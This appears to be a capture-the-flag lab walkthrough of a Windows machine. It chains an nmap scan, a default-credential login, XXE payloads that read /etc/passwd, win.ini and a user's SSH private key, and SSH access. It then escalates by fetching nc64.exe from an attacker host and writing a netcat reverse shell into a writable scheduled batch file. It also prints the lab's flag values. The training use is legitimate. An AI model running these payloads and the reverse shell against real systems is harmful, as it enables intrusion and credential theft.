[[ping]] the host
sudo nmap -sC  -A -Pn --min-rate=1000 \[target host IP]
*open browser and visit host and login with admin:password
Set up Firefox proxy to be read by Burpsuite and browse to Order. Submit request and view request and response.*
*Lets try to read /etc/passwd in different ways. For Windows you could try to
read: C:\windows\system32\drivers\etc\hosts
In this first case notice that SYSTEM "file:///etc/passwd" will also work.
\<!--?xml version="1.0" ?-->
\<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
\<data>&example;\</data>*

\<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]>
*&xxe should be in the item XML entity for it to be shown.*

*View page source and see "Modified by Daniel"*
\<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///c:/users/daniel/.ssh.id_rsa'>]>
touch id_rsa
ls -la id_rsa
chmod 400 id_rsa          *set privileges for id_rsa file so as to be accepted by SSH client*

ssh -i id_rsa daniel@\[target host IP]
type Desktop\user.txt *032d2fc8952a8c24e39c8f0ee9918ef7*

whoami /priv *to check current privileges*

cd C:\
dir
cd Log-Management
dir
type job.bat *purpose seems to be related to clearing logfiles using Admin account. wevtutil is also run, which has the ability to retrieve info about event logs and publishers*

*Since the file itself can only be run by an Administrator, we could try our luck and see if our usergroup could at least edit the file, instead of running it, or if there are any mismatched permissions between the script and the usergroup or file configuration. We can achieve this by using the icacls command*

icacls job.bat
*BUILTIN\Users has full control (F) over the file. The BUILTIN\Users group represents all local users, which includes Daniel as well. We might be able to get a shell by transferring netcat to the system and modifying the script to execute a reverse shell. See the currently scheduled tasks by typing the schtasks command. If our permission level doesn't allow us to view this list through Windows' command line, we can quickly use powershell's ps command instead, which represents another security misconfiguration that works against the server.*

*download nc64.exe on our system, start up a Python HTTP server on one of our ports, then switch to the shell we have on the host to issue a wget command with our address and the nc64.exe file residing on our server. This will initialize a download from the host to our Python server for the executable.*

wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
sudo python3 -m http.server 800

*in the shell on target host*
wget http://[attacker host IP]:800/nc64.exe -outfile nc64.exe
dir

exit
echo C:\Log-Management\nc64.exe -e cmd.exe \[attacker host IP] \[port] > C:\Log-Management\job.bat

sudo nc -lnvp \[port]

dir C:\root.txt /s /b 2>nul
type C:\Users\Administrator\Desktop\root.txt *f574a3e7650cebd8c39784299cb570f8*


